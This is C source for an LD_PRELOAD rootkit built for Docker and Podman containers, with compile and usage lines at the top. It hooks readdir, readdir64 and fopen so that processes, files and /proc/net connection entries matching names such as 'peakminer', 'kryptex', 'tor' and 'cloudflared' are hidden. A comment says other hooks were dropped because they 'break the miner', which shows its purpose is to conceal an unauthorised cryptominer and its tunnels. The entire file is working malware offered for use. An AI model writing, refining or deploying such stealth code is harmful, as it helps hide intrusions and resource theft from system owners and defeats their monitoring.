/*
 * Container Rootkit v2 - LD_PRELOAD based stealth kit
 * Optimized for Docker/Podman containers (no kernel module needed)
 * Compatible with peakminer 2.2.1
 * 
 * Hides:
 * - Processes (by PID and name patterns)
 * - Network connections (specific ports)
 * - Files and directories
 * 
 * Compile: gcc -shared -fPIC -o librootkit.so container_rootkit_v2.c -ldl
 * Usage: LD_PRELOAD=/path/to/librootkit.so <command>
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>

// Strings to hide (process names, directories, ports)
static const char* HIDDEN_STRINGS[] = {
    "peak", "compute_task", "compute_engine", "pearl",
    "peakminer", "miner", "kryptex", "8048",
    "tor", "torsocks", "cloudflared", "5053", "9050",
    NULL
};

// Function pointers to original functions (removed stat/lstat/access)
static struct dirent *(*orig_readdir)(DIR *) = NULL;
static struct dirent64 *(*orig_readdir64)(DIR *) = NULL;
static FILE *(*orig_fopen)(const char *, const char *) = NULL;

// Initialize function pointers once
static void init_hooks(void) {
    if (orig_readdir) return;
    orig_readdir = dlsym(RTLD_NEXT, "readdir");
    orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    orig_fopen = dlsym(RTLD_NEXT, "fopen");
}

// Check if string contains any hidden pattern
static int contains_hidden_string(const char *str) {
    if (!str) return 0;
    for (int i = 0; HIDDEN_STRINGS[i]; i++) {
        if (strstr(str, HIDDEN_STRINGS[i])) return 1;
    }
    return 0;
}

// Check if /proc entry should be hidden
static int should_hide_proc_entry(const char *pid_str) {
    if (!pid_str || !orig_fopen) return 0;
    
    // Only check numeric PIDs
    if (pid_str[0] < '0' || pid_str[0] > '9') return 0;
    
    char path[512], cmdline[512];
    snprintf(path, sizeof(path), "/proc/%s/cmdline", pid_str);
    
    FILE *f = orig_fopen(path, "r");
    if (!f) return 0;
    
    size_t n = fread(cmdline, 1, sizeof(cmdline) - 1, f);
    fclose(f);
    
    if (n > 0) {
        cmdline[n] = '\0';
        return contains_hidden_string(cmdline);
    }
    return 0;
}

// Hook readdir - hide directory entries
struct dirent *readdir(DIR *dirp) {
    init_hooks();
    if (!orig_readdir) return NULL;
    
    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        // Hide entries matching hidden strings
        if (contains_hidden_string(entry->d_name)) continue;
        
        // Hide /proc entries
        if (should_hide_proc_entry(entry->d_name)) continue;
        
        return entry;
    }
    return NULL;
}

// Hook readdir64 - 64-bit version
struct dirent64 *readdir64(DIR *dirp) {
    init_hooks();
    if (!orig_readdir64) return NULL;
    
    struct dirent64 *entry;
    while ((entry = orig_readdir64(dirp)) != NULL) {
        if (contains_hidden_string(entry->d_name)) continue;
        if (should_hide_proc_entry(entry->d_name)) continue;
        return entry;
    }
    return NULL;
}

// REMOVED: stat, lstat, access hooks - they break the miner
// Only hide in /proc listing, don't block file operations

// Hook fopen - filter network connection files
FILE *fopen(const char *pathname, const char *mode) {
    init_hooks();
    if (!orig_fopen) return NULL;
    
    FILE *f = orig_fopen(pathname, mode);
    if (!f) return NULL;
    
    // Filter /proc/net files to hide our connections
    if (pathname && (strstr(pathname, "/proc/net/tcp") || 
                     strstr(pathname, "/proc/net/tcp6") ||
                     strstr(pathname, "/proc/net/udp") ||
                     strstr(pathname, "/proc/net/udp6"))) {
        FILE *temp = tmpfile();
        if (!temp) return f;
        
        char line[2048];
        while (fgets(line, sizeof(line), f)) {
            if (!contains_hidden_string(line)) {
                fputs(line, temp);
            }
        }
        
        fclose(f);
        rewind(temp);
        return temp;
    }
    
    return f;
}

// Constructor - called when library is loaded
__attribute__((constructor))
static void rootkit_init(void) {
    init_hooks();
    // Silent initialization - no output
}
